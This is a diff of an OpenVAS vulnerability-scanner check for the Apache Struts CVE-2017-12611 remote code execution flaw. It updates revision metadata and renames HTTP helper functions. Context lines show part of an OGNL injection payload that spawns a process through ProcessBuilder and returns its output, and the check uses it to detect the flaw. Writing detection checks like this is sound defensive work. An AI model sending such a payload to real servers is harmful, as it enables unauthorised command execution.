@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_apache_struts_CVE_2017_12611.nasl 12875 2018-12-21 15:01:59Z cfischer $
+# $Id: gb_apache_struts_CVE_2017_12611.nasl 13679 2019-02-15 08:20:11Z cfischer $
 #
 # Apache Struts 'CVE-2017-12611' Remote Code Execution Vulnerability
 #
@@ -28,10 +28,10 @@
 if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.108243");
-  script_version("$Revision: 12875 $");
+  script_version("$Revision: 13679 $");
   script_tag(name:"cvss_base", value:"7.5");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
-  script_tag(name:"last_modification", value:"$Date: 2018-12-21 16:01:59 +0100 (Fri, 21 Dec 2018) $");
+  script_tag(name:"last_modification", value:"$Date: 2019-02-15 09:20:11 +0100 (Fri, 15 Feb 2019) $");
   script_tag(name:"creation_date", value:"2017-09-11 12:00:00 +0200 (Mon, 11 Sep 2017)");
   script_cve_id("CVE-2017-12611");
   script_name("Apache Struts 'CVE-2017-12611' Remote Code Execution Vulnerability");
@@ -78,7 +78,7 @@ if( http_is_cgi_scan_disabled() ||
 port = get_http_port( default:80 );
 host = http_host_name( dont_add_port:TRUE );
 
-cgis = get_http_kb_cgis( port:port, host:host );
+cgis = http_get_kb_cgis( port:port, host:host );
 if( ! cgis ) exit( 0 );
 
 foreach cgi( cgis ) {
@@ -97,7 +97,7 @@ foreach cgi( cgis ) {
          "clear()).(#context.setMemberAccess(#dm)))).(#p=new java.lang.ProcessBuilder(" + c + "))." +
          "(#p.redirectErrorStream(true)).(#process=#p.start()).(@org.apache.commons.io.IOUtils@toString(#process.getInputStream()))}";
 
-    urls = create_exploit_req( cgiArray:cgiArray, ex:urlencode( str:ex ) );
+    urls = http_create_exploit_req( cgiArray:cgiArray, ex:urlencode( str:ex ) );
     foreach url( urls ) {
 
       req = http_get_req( port:port, url:url );
@@ -139,7 +139,7 @@ foreach cgi( cgis ) {
 
   cgiArray = split( cgi, sep:" ", keep:FALSE );
 
-  urls = create_exploit_req( cgiArray:cgiArray, ex:urlencode( str:ex ) );
+  urls = http_create_exploit_req( cgiArray:cgiArray, ex:urlencode( str:ex ) );
   foreach url( urls ) {
 
     req = http_get_req( port:port, url:url );
